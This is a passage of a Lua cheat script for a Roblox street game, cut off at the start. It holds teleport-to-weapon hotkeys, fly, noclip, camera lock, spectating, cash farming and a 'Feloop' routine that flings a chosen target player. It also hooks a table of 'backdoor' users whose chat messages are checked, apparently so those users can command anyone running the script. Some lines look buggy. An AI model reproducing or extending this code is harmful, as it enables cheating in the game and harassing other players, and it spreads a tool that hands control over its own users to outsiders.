        if Key.KeyCode == Enum.KeyCode[BuyUziKey] and game.PlaceId == (StreetsID) and Legitmode == false then 
            local Root = Client.Character:FindFirstChild("HumanoidRootPart") or Client.Character:FindFirstChild("Torso")
            local OldPos = Root.Position;Teleporting = true
            if workspace:FindFirstChild(GunTable["uzi"]) then 
                game:GetService
'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-272.830811, 3.0072546, 361.377502)
                repeat Root.CFrame = Root.CFrame * CF(math.random(0.1, 900),0, math.random(0.1, 900))
                    while Uis:IsKeyDown(Enum.KeyCode[BuyUziKey]) and Teleporting == true and RService.Heartbeat:Wait() do 
                        game:GetService
'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-272.830811, 3.0072546, 361.377502)
                        Root.CFrame = workspace[GunTable["uzi"]]:FindFirstChildOfClass("Part").CFrame + Vec3(0.1, 1.1, 0.1)
                    end
                until not Uis:IsKeyDown(Enum.KeyCode[BuyUziKey])
            end
                            Root = OldPos;Teleporting = false 
        end
        if Key.KeyCode == Enum.KeyCode[BuyGlockKey] and game.PlaceId == (StreetsID) and Legitmode == false then 
            local Root = Client.Character:FindFirstChild("HumanoidRootPart") or Client.Character:FindFirstChild("Torso")
            local OldPos = Root.Position;Teleporting = true
            if workspace:FindFirstChild(GunTable["glock"]) then 
                game:GetService
'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-972.971, 0.3, -92.19)
                repeat Root.CFrame = Root.CFrame * CF(math.random(0.1, 900),0, math.random(0.1, 900))
                    while Uis:IsKeyDown(Enum.KeyCode[BuyGlockKey]) and Teleporting == true and RService.Heartbeat:Wait() do 
                        Root.CFrame = workspace[GunTable["glock"]]:FindFirstChildOfClass("Part").CFrame + Vec3(0.1, 1.1, 0.1)
                    game:GetService
'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-972.971, 0.3, -92.19)
                    end
                until not Uis:IsKeyDown(Enum.KeyCode[BuyGlockKey])
            end
                                        Root = OldPos;Teleporting = false 
        end
    end
end)
Uis.InputEnded:Connect(function(Key)
    if not Uis:GetFocusedTextBox() and Legitmode == false then
        if Key.KeyCode == Enum.KeyCode.W then 
            KeysTable["W"] = false 
        end
        if Key.KeyCode == Enum.KeyCode.A then 
            KeysTable["A"] = false
        end
        if Key.KeyCode == Enum.KeyCode.S then 
            KeysTable["S"] = false 
        end
        if Key.KeyCode == Enum.KeyCode.D then 
            KeysTable["D"] = false 
        end
        if Key.KeyCode == Enum.KeyCode.LeftShift then
            KeysTable["LShift"] = false
        end
        if Key.KeyCode == Enum.KeyCode[BuyAmmoKey] and Legitmode == false then 
            RootTP = OldPos;
            Teleporting = false;Keyheld = false
        end
        if Key.KeyCode == Enum.KeyCode[BuyUziKey] and Legitmode == false then 
            RootPosOG = OGPos 
            Teleporting = false;Keyheld = false 
        end
        if Key.KeyCode == Enum.KeyCode[BuyGlockKey] and Legitmode == false then 
            RootPosOG = OGPos 
            Teleporting = false;Keyheld = false 
        end
    end
end)


 game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(key)
 if key == "f" and Flying == false then
    local air = Instance.new("Part", workspace)
air.Size = Vector3.new(120,1,120)
air.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
air.Transparency = 1
air.Anchored = true
air.Name = "FlyBase"

for i = 1, math.huge do
   air.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
   wait(0.01)
end
 end
end)

 game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(key)
 if key == "f" and Flying == true then
for i,v in pairs(game.workspace:GetDescendants()) do if v.name == "FlyBase" then v:Destroy() end end
 end
end)


-- //CharacterAdded/Died
Client.Character.Humanoid.Died:Connect(function()
    if Flying then 
        togglefly() 
    end
end)
Client.CharacterAdded:Connect(function()
    repeat wait() 
    until Client.Character:FindFirstChild("Humanoid")
    Client.Character.Humanoid.Died:Connect(function()
        if Flying then 
            togglefly() 
        end
    end)
    if AntiFe then 
        AntiFe = false 
    end
    if TPBypass == true then 
        Client.Character:WaitForChild("HumanoidRootPart")
        Client.Character["HumanoidRootPart"]:Destroy()
    end
end)

-- //Commands
Commands["Fly"] = {
    ["Aliases"] = {"togglefly", "fly", "f"};
    ["Function"] = function()
        togglefly()
    end
}
Commands["Flyspeed"] = {
    ["Aliases"] = {"flyspeed", "fspeed", "fs"};
    ["Function"] = function(args)
        if args[1] then
            FSpeed = tonumber(args[1])
        end
        Notify("Flyhacks", "Flyspeed = "..tonumber(args[1]), "", 3)
    end
}


RService.Heartbeat:Connect(function()
    if Camlock ~= false and CamlockTarget and CamlockTarget.Character and CamlockTarget.Character:FindFirstChild(CamPart) then 
Camera.CoordinateFrame = CF(Camera.CFrame.p, CamlockTarget.Character.HumanoidRootPart.Position)
    end
end)
RService.Stepped:Connect(function()
    if Noclip == true then 
        local LG = Client.Character:GetChildren()
        for i = 1, #LG do 
            if LG[i]:IsA("BasePart") then 
                LG[i].CanCollide = false 
            end
        end
        pcall(function()
            if Client and Client.Backpack then 
                Client.Backpack:FindFirstChild("Glock").Barrel.CanCollide = false 
            else
                Client.Character:FindFirstChild("Glock").Barrel.CanCollide = false
            end
        end)
    end
    if Feloop == true and FeloopTarget ~= nil and game.PlaceId ~= (StreetsID) then 
        if LocalP() and LocalP():FindFirstChild("Right Leg") and LocalP():FindFirstChildOfClass("Humanoid") then 
            LocalP():WaitForChild("Right Leg", 10):Destroy()
            local NewHum = LocalP().Humanoid:Clone()
            LocalP().Humanoid:Destroy()
            NewHum.Parent = LocalP();Camera.CameraSubject = LocalP() 
        end
        for _, t in next, Client.Backpack:GetChildren() do 
            if t:IsA("Tool") then
                t.Parent = LocalP() 
                t.Grip = FlingPF.CFrame * CF(math.random(5, 10),0, math.random(-5, -10)) + TargetPF.CFrame + TargetPF.Velocity/5 + TargetPF.RotVelocity/math.huge + TargetPF.Velocity/math.huge + TargetPF.RotVelocity/5
            end 
        end
        if FeloopTarget and FeloopTarget.Character and FeloopTarget.Character:FindFirstChild("Torso") then 
            if TPBypass == true then TPBypass = false end
            local ClientPF = LocalP():FindFirstChild("HumanoidRootPart") or LocalP():FindFirstChild("Torso")
            getgenv().TargetPF = FeloopTarget.Character:FindFirstChild("HumanoidRootPart") or FeloopTarget.Character:FindFirstChild("Torso")
            getgenv().FlingPF = FeloopTarget.Character:FindFirstChild("Right Arm")
            ClientPF.CFrame = TargetPF.CFrame + TargetPF.Velocity/-5 + TargetPF.RotVelocity/-math.huge + TargetPF.Velocity/-math.huge + TargetPF.RotVelocity/-5
            if FlingPF then 
                ClientPF.CFrame = TargetPF.CFrame + TargetPF.Velocity/-5 + TargetPF.RotVelocity/-math.huge + TargetPF.Velocity/-math.huge + TargetPF.RotVelocity/-5
                ClientPF.CFrame = FlingPF.CFrame * CF(math.random(10, 5),0, math.random(-10, -5))
                wait()
                ClientPF.CFrame = FlingPF.CFrame * CF(math.random(5, 10),0, math.random(-5, -10))
            elseif not FlingPF then
                ClientPF.CFrame = TargetPF.CFrame
            end
        end
    end
    if AntiFe == true then 
        local CTool = Client.Character:FindFirstChildOfClass("Tool");
        if not table.find(RealTools, CTool) and Client.Character:FindFirstChild("Right Arm") and Client.Character["Right Arm"]:FindFirstChild("RightGrip") then 
            CTool:Destroy()
        end
    end
    if Spying == true and ViewTarget ~= nil then 
        Camera.CameraSubject = ViewTarget.Character
    end
    if CashFarming == true then 
        repeat RService.Heartbeat:Wait()
            Client.Character.HumanoidRootPart.CFrame = workspace.RandomSpawner.CFrame
            wait(0.3)
            Client.Character.HumanoidRootPart.CFrame = workspace.RandomSpawner.CFrame
            wait(0.3)
            Client.Character.HumanoidRootPart.CFrame = workspace.RandomSpawner.CFrame
        until CashFarming == false
    end
    if Flying and Client.Character then
        if Client.Character and Client.Character:FindFirstChild("Humanoid") then
            RService.Heartbeat:Wait()
            Client.Character.Humanoid.PlatformStand = false;Client.Character.Humanoid.Sit = false
            Client.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
        end
	end
    if Client.Character:FindFirstChild("FlyPart") then
        Client.Character:FindFirstChild("FlyPart").CFrame = Client.Character.HumanoidRootPart.CFrame * CFrame.new(0, -3.5, 0)
    end
end)
local LPRS = Players:GetPlayers()
for i = 1, #LPRS do
    local CoolKidPlayer = LPRS[i]
    if tostring(CoolKidPlayer) then 
        Spy(CoolKidPlayer)
    end
    if BackDoorUsersTable[CoolKidPlayer.UserId] then
        local HeadFromCoolKid = CoolKidPlayer.Character:WaitForChild("Head", 10)
        if HeadFromCoolKid then
            EspCoolKid(CoolKidPlayer)
        end
        CoolKidPlayer.CharacterAdded:Connect(function()
            CoolKidPlayer.Character:WaitForChild("Head", 10)
            EspCoolKid(CoolKidPlayer)
        end)
        CoolKidPlayer.Chatted:Connect(function(ChattedWord)
            BDCheck(CoolKidPlayer, ChattedWord)
        end)
    end
    local ChattedEvent2;ChattedEvent2 = CoolKidPlayer.Chatted:Connect(function(Chat)
        local DetectUser2 = Checking(CoolKidPlayer, Chat)
        if DetectUser2 then 
            ChattedEvent2:Disconnect()
        end
    end)
end
Players.PlayerAdded:Connect(function(CKidPlayer)
    if BackDoorUsersTable[CKidPlayer.UserId] then
        CKidPlayer.CharacterAdded:Connect(function()
            CKidPlayer.Character:WaitForChild("Head", 10)
            EspCoolKid(CKidPlayer)
        end)
        CKidPlayer.Chatted:Connect(function(Chat)
            BDCheck(CKidPlayer, Chat)
        end)
    end
    Spy(CKidPlayer)
    local ChattedEvent1;ChattedEvent1 = CKidPlayer.Chatted:Connect(function(Chat)
        local DetectUser1 = Checking(CKidPlayer, Chat)
        if DetectUser1 then 
            ChattedEvent1:Disconnect()
        end
    end)
    if CKidPlayer == tostring(FeloopTarget) then 
        FeloopTarget = CKidPlayer 
    end
    if CKidPlayer == tostring(AimlockTarget) then 
        AimlockTarget = CKidPlayer
    end
    if CKidPlayer == tostring(CamlockTarget) then 
        CamlockTarget = CKidPlayer
    end
    if CKidPlayer == tostring(EspTarget) then 
        EspTarget = CKidPlayer
    end
    if CKidPlayer == tostring(ToggleTarget) then 
        ToggleTarget = CKidPlayer
    end
end)
Players.PlayerRemoving:Connect(function(WKidPlayer)
    if WKidPlayer == tostring(AimlockTarget) then 
        AimlockTarget = nil;Aimlock = false 
    end
    if WKidPlayer == tostring(FeloopTarget) then 
        FeloopTarget = nil;Feloop = false 
    end
    if WKidPlayer == tostring(CamlockTarget) then 
        CamlockTarget = nil;Camlock = false 
    end
    if WKidPlayer == tostring(ViewTarget) then 
        ViewTarget = nil;Spying = false 
    end
    if WKidPlayer == tostring(SKTarget) then 
        SKTarget = nil;ShottyFollow = false 
    end
    if WKidPlayer == tostring(GKTarget) then
        GKTarget = nil;ShottyFollow = false
    end
end)